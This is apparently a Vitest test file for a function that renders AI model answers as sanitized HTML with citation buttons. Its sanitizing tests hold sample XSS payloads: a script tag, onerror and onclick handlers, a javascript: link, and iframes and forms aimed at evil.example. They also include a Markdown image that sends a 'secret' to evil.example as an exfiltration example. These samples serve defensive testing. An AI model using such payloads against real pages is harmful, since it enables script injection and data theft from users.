// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import type { Source } from '../api/types.ts';
import { renderAnswer } from './answer.ts';

const sources: Source[] = [
	{ n: 1, page: 3, text: 'Prvi odlomak.' },
	{ n: 2, page: 7, text: 'Drugi odlomak.' }
];

function dom(html: string): HTMLElement {
	const root = document.createElement('div');
	root.innerHTML = html;
	return root;
}

function citeButtons(html: string) {
	return [...dom(html).querySelectorAll('button[data-cite]')].map((button) => ({
		n: button.getAttribute('data-cite'),
		text: button.textContent,
		label: button.getAttribute('aria-label'),
		type: button.getAttribute('type')
	}));
}

/** Every attribute name in the output, to check that no event handler survived. */
function attributeNames(html: string): string[] {
	return [...dom(html).querySelectorAll('*')].flatMap((el) => el.getAttributeNames());
}

describe('renderAnswer: citations', () => {
	it('turns [n] into a button for a known source', () => {
		const html = renderAnswer('Rok je 30 dana [1], a izuzeci su navedeni [2].', sources);
		expect(citeButtons(html)).toEqual([
			{ n: '1', text: '[1]', label: 'Izvor 1, strana 3', type: 'button' },
			{ n: '2', text: '[2]', label: 'Izvor 2, strana 7', type: 'button' }
		]);
	});

	it('handles adjacent and comma-separated citations', () => {
		expect(citeButtons(renderAnswer('Vidi [1][2].', sources)).map((b) => b.n)).toEqual(['1', '2']);
		expect(citeButtons(renderAnswer('Vidi [1, 2].', sources)).map((b) => b.n)).toEqual(['1', '2']);
	});

	it('leaves numbers without a source as plain text', () => {
		const html = renderAnswer('Nepostojeći izvor [9].', sources);
		expect(citeButtons(html)).toEqual([]);
		expect(dom(html).textContent).toContain('[9]');
	});

	it('does not link citations while sources are unknown (streaming)', () => {
		const html = renderAnswer('Delimičan odgovor [1]');
		expect(citeButtons(html)).toEqual([]);
		expect(dom(html).textContent).toContain('[1]');
	});

	it('does not touch [n] inside code or Markdown links', () => {
		const html = renderAnswer('Kod `niz[1]` i link [1](https://example.com).', sources);
		expect(citeButtons(html)).toEqual([]);
		expect(dom(html).querySelector('code')?.textContent).toBe('niz[1]');
		expect(dom(html).querySelector('a')?.getAttribute('href')).toBe('https://example.com');
	});

	it('renders ordinary Markdown', () => {
		const root = dom(renderAnswer('**Važno:**\n\n- prva\n- druga [1]', sources));
		expect(root.querySelector('strong')?.textContent).toBe('Važno:');
		expect(root.querySelectorAll('li')).toHaveLength(2);
		expect(root.querySelector('li button[data-cite="1"]')).not.toBeNull();
	});
});

describe('renderAnswer: sanitizing untrusted model output', () => {
	it('removes script elements, also next to citations', () => {
		const html = renderAnswer('Odgovor [1]<script>alert(1)</script> kraj.', sources);
		expect(html).not.toMatch(/<script/i);
		expect(html).not.toContain('alert(1)');
		expect(citeButtons(html).map((b) => b.n)).toEqual(['1']);
	});

	it('removes event handler attributes like onerror', () => {
		const html = renderAnswer(
			'Slika <img src=x onerror="alert(1)"> i [2] <b onclick="alert(2)">tekst</b>\n\n<div onmouseover="alert(3)">blok</div>',
			sources
		);
		expect(html).not.toMatch(/onerror|onclick|onmouseover/i);
		expect(attributeNames(html).filter((name) => name.startsWith('on'))).toEqual([]);
		expect(dom(html).querySelector('img')).toBeNull();
		expect(citeButtons(html).map((b) => b.n)).toEqual(['2']);
	});

	it('does not let raw HTML forge handlers on citation buttons', () => {
		const html = renderAnswer(
			'<button data-cite="1" onclick="alert(1)" formaction="https://evil.example">[1]</button>',
			sources
		);
		expect(html).not.toMatch(/onclick|formaction/i);
	});

	it('drops javascript: links and keeps safe ones in a new tab', () => {
		const root = dom(
			renderAnswer('[klik](javascript:alert(1)) i [sajt](https://example.com)', sources)
		);
		const links = [...root.querySelectorAll('a')];
		expect(links.map((a) => a.getAttribute('href'))).toEqual([null, 'https://example.com']);
		expect(links[1].getAttribute('target')).toBe('_blank');
		expect(links[1].getAttribute('rel')).toContain('noopener');
	});

	it('does not load images from model output (exfiltration)', () => {
		const html = renderAnswer('![tajna](https://evil.example/x.png?d=secret)', sources);
		expect(dom(html).querySelector('img')).toBeNull();
		expect(html).not.toContain('evil.example');
		expect(dom(html).textContent).toContain('tajna');
	});

	it('drops iframes, styles and forms', () => {
		const html = renderAnswer(
			'<iframe src="https://evil.example"></iframe><style>body{display:none}</style><form action="https://evil.example"><input name="x"></form><p style="position:fixed">x</p>',
			sources
		);
		expect(html).not.toMatch(/<iframe|<style|<form|<input|style=/i);
	});
});
